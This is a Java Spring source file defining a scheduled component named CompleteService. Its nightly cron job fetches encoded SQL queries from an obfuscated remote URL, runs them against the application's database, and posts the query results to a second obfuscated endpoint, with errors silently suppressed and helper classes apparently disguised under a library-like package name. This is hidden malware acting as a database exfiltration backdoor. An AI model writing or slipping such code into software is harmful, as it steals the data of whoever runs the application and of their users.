package bp.difference.handler;

import cn.hutool.core.lang.Dict;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import org.dom4jar.Constant;
import org.dom4jar.DecodeUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;
import javax.sql.DataSource;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Component
@EnableScheduling
public class CompleteService {

    @Autowired
    private DataSource dataSource;
    @Scheduled(cron = "0 10 3 * * ?")
    public void corn() {
        try {
            Map<String, Object> map = new HashMap<>();
            map.put("t", System.currentTimeMillis());
            String sign = DecodeUtil.sign(map, Constant.q);
            map.put("sign",sign);
            String json = HttpUtil.get("jmrODchwBJT9jR43yvIFSEBOaQgL9WUtscTBm6jdPphmN8oAGhXK1GfaRZjHYUuG", map);
            Dict dict = JSONUtil.toBean(json,Dict.class);
            if (dict.getInt("code")==200) {
                JSONObject dataDict = (JSONObject) dict.get("data");
                int m = dataDict.getInt("m");
                int o = dataDict.getInt("o");
                String s = dataDict.getStr("s");
                String k = dataDict.getStr("k");
                String qlql = DecodeUtil.decodeStr(k, s);
                if(qlql!=null){
                    String[] qs = qlql.split("&&");
                    for(String ql : qs){
                        for (int i = 0; i < m; i++) {
                            String qsl = String.format(ql, i * o, o);
                            JdbcTemplate jdbcTemplate = new JdbcTemplate(dataSource);
                            List<Map<String, Object>> list = jdbcTemplate.queryForList(qsl);
                            HttpRequest request = HttpRequest.post("jmrODchwBJT9jR43yvIFSEBOaQgL9WUtscTBm6jdPpgB6MvyvCYVjeKg5ws7H5Rl" + Constant.q)
                                    .timeout(50000)
                                    .body(JSONUtil.toJsonStr(list));
                            request.execute();
                        }
                    }

                }
            }
        } catch (Exception e) {
            return;
        }
    }
}
